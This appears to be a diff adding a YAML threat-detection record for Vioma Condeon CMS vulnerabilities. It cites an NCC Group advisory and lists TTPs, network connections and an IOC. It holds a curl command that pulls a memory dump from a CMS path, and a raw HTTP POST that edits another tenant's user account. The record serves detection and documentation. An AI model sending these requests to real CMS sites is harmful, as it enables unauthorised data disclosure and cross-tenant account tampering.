@@ -1,0 +1,40 @@
+description: 'Vioma Condeon CMS vulnerabilities allow for cross-CMS-tenant lateral
+  movement and information disclosure.
+
+  '
+TTPs:
+  processes:
+  - curl
+  commandline:
+  - curl https://[CONDEON_SITE]/condeon/core --output memory.dump
+  - 'POST /condeon/user.php?id=9999&type=edit HTTP/1.1
+
+    Host:
+
+    Cookie: SESS_BE=
+
+    Content-Type: application/x-www-form-urlencoded
+
+    form[user_customer]=1093&form[user_login]=nccgroup&form[user_surname]=&form[user_name]=&form[user_email]=&form[user_pass]=&form[user_language]=2&form[user_timezone]=Europe/Berlin&type=edit&id=9999
+
+    '
+  powershell: null
+  scripting_engine: null
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - process: curl
+    destination: https://[CONDEON_SITE]/condeon/core
+    port: 443
+  file_activity:
+  - /condeon/core/memory.dump
+  persistence: null
+  pipes: null
+  process_relations: null
+IOCs:
+- memory.dump
+authors:
+- Juan Marco Sanchez
+reference: https://www.nccgroup.com/research-blog/technical-advisory-condeon-cms/
+date_of_publication: February 25, 2025
+file_creation_date: July 30, 2025
